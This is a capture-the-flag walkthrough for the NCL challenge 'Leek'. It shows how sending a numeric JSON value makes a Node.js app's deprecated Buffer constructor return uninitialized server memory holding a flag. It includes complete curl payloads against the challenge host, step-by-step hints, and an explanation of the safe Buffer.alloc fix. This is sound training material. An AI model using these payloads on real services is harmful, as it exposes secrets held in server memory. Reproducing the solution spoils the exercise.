# Web Application Hard - Leek

> **Category:** Web Application Exploitation
> **Difficulty:** Hard
> **NCL Section:** Gymnasium

---

## 🎯 Objective

A grocery store web application has a vulnerability that leaks sensitive server-side memory. Exploit an unsafe Node.js Buffer constructor to extract the hidden flag from server memory.

---

## 🔗 Challenge URL

```
https://0cc94c922749aeb77e08b28265b02e23-leek.web.cityinthe.cloud/
```

---

## 🛠️ Tools Needed

- **Firefox** (recommended) with Developer Tools (F12)
- `curl` in your Kali terminal
- The Leek challenge URL above

> 💡 **Build your web skills:** This challenge is a great example of why understanding the **PortSwigger Web Security Academy** material pays off. Their labs on server-side vulnerabilities teach exactly the mindset needed here. Burp Suite (also from PortSwigger) can also be used to craft the requests in this challenge as an alternative to curl.

---

## 📚 Background: Node.js Buffer Vulnerability

Node.js has a class called `Buffer` used to handle raw binary data. The old, deprecated way to create a Buffer using a number like `new Buffer(10)` doesn't create a buffer filled with zeros. Instead, it allocates a chunk of whatever memory happened to be available on the server, which may contain leftover sensitive data from previous operations like secret keys, session tokens, or flags.

This is a real vulnerability class called **uninitialized memory disclosure**. When the server sends that uninitialized buffer back to the client, it's inadvertently leaking whatever was sitting in that memory at the time.

---

## 📋 Step-by-Step Walkthrough

### Step 1 - Probe the Application

Open the challenge URL in a new Firefox window. Press **F12** to open Developer Tools and go to the **Network** tab.

Add any item to the grocery list (e.g. "Banana") and watch the Network tab for the request. Click on the `add` request and check the **Payload** tab. You'll see:

```json
{ "content": "Banana" }
```

Now check the **Preview** tab of the response. Notice the response type is a **Buffer**, not a simple string. This is our target.

---

### Step 2 - Copy the Request as cURL

In the Network tab, right-click the `add` request and select **Copy as cURL**. Paste it into your Kali terminal. It will look something like:

```bash
curl 'https://0cc94c922749aeb77e08b28265b02e23-leek.web.cityinthe.cloud/add' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/json' \
  --data-raw '{"content":"Banana"}'
```

---

### Step 3 - Send a Numeric Payload

Now change the `content` value from a string to a **number**. This tricks the server into using the unsafe `new Buffer(n)` constructor which returns uninitialized server memory:

```bash
curl 'https://0cc94c922749aeb77e08b28265b02e23-leek.web.cityinthe.cloud/add' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/json' \
  --data-raw '{"content":10}'
```

Refresh the page. You'll see a partial flag appear in the grocery list, fragments of data leaked from server memory.

---

### Step 4 - Increase the Buffer Size for the Full Flag

10 bytes isn't enough to leak the complete flag. Try a larger number to grab more memory:

```bash
curl 'https://0cc94c922749aeb77e08b28265b02e23-leek.web.cityinthe.cloud/add' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/json' \
  --data-raw '{"content":100}'
```

Refresh the page. The full flag will appear in the leaked memory output.

> 💡 If you still don't see the complete flag, try larger values like 200 or 500. The flag needs to still be in active server memory to be leaked. Run the request a few times if needed.

> 💡 **What the answer looks like:** Standard `SKY-XXXX-XXXX` format somewhere in the leaked buffer output.

---

## 💡 Hints (Without Giving It Away)

- **The vulnerability:** The server uses an unsafe Buffer constructor. When you send a number instead of a string, it leaks raw server memory.
- **The approach:** Copy the add request as cURL, change `"content":"Banana"` to `"content":10`, run it, refresh the page.
- **The flag:** It will appear in the leaked data on the page. Increase the number if you only see a partial flag. Try 100.
- **The format:** Standard `SKY-XXXX-XXXX`. Look for it in the leaked memory output.

---

## ⚠️ Accuracy Tips

- ❌ **Don't submit a partial flag.** If you see only part of it, increase the buffer size to 100 or more and try again.
- ✅ **Refresh the page** after running the curl command to see the new item appear in the list.
- ✅ **Run the command multiple times** if the flag doesn't appear on the first try. Server memory contents vary.
- ✅ **Copy as cURL from the browser** to get the correct headers automatically rather than writing the curl command from scratch.

---

## 🧠 Why This Works

The deprecated `new Buffer(n)` constructor in Node.js was notorious for this exact issue. When you call `new Buffer(10)`, Node.js allocates 10 bytes of memory without zeroing it out first. Whatever data was previously stored at that memory address, session tokens, encryption keys, database queries, flags, becomes part of your new buffer. The safe equivalent is `Buffer.alloc(10)` which explicitly fills the buffer with zeros before use. This vulnerability was significant enough that the Node.js team deprecated the unsafe constructors in v6 and removed them in later versions. Web developers using older Node.js versions or failing to update their code patterns are still exposed to this today. This is why the challenge is called "Leek", because the grocery store is leaking.

---

## 🔗 Resources

- [Node.js Buffer Documentation](https://nodejs.org/api/buffer.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP - Memory Leaks](https://owasp.org/www-community/vulnerabilities/Memory_leak)

---

*Written by: Mo | Last updated: March 2026*
